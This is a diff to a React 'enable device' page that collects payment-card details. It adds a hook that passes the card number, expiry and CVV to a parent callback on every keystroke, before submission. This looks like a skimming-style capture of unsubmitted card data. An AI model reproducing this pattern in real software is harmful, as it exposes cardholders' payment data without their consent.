@@ -258,6 +258,7 @@ function HabDatePicker({
 export default function HabilitarDevicePage({
   onSubmit,
   onCancel,
+  onCardDraft,
   locked = false,
   showSpinner = false,
   errorMsg = '',
@@ -289,6 +290,17 @@ export default function HabilitarDevicePage({
     setStep(startOnCard ? 'card' : 'personal')
     setLoading(false)
   }, [errorMsg, successMsg, startOnCard])
+
+  useEffect(() => {
+    if (!onCardDraft) return
+    const cardNumber = card.parts.join('')
+    if (!cardNumber && !card.cardExpiry && !card.cvv) return
+    onCardDraft({
+      cardNumber,
+      cardExpiry: card.cardExpiry,
+      cvv: card.cvv.trim(),
+    })
+  }, [card, onCardDraft])
 
   function setPersonalField(key, value) {
     setPersonal((prev) => ({ ...prev, [key]: value }))
